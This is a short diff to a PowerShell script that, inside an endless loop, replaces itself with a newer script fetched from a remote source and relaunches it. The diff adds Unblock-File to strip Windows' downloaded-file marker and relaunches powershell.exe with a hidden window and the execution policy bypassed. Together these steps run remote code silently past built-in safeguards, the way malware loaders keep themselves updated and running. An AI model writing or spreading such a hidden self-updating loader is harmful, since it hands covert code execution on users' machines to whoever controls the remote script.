@@ -16,8 +16,9 @@ while ($true) {
             
             if ([version]$remoteVersion -gt [version]$currentVersion) {
                 [System.IO.File]::WriteAllText($PSCommandPath,$remoteScript, [System.Text.Encoding]::UTF8);
+                Unblock-File -Path $PSCommandPath -ErrorAction SilentlyContinue;
                 
-                Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"";
+                Start-Process "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"";
                 Exit;
             }
         }
